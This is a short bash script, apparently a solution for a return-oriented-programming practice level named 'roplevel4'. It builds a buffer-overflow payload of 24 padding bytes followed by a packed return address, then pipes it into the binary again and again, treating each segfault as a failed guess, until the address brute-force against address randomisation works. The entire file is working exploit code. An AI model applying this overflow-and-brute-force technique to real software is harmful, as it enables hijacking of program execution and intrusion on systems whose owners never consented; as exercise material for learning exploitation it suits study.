#!/bin/bash

str=`python2 -c "import struct; print('AAAABBBBCCCCDDDDEEEEFFFF' + struct.pack('I', 0x565f320d))"` # one of the possible addresses 0x56###20d
i=1

while [ $? -ne 1 ]; do
    echo $str;
    echo $str | ./roplevel4;
    if [ $? -eq 139 ]; then
        echo "It crashed! Try Again..."
    else
	printf "\n\n\nWe did it... Possibly... After $i tries..."
	exit 1
    fi
    i=$(($i + 1))
done
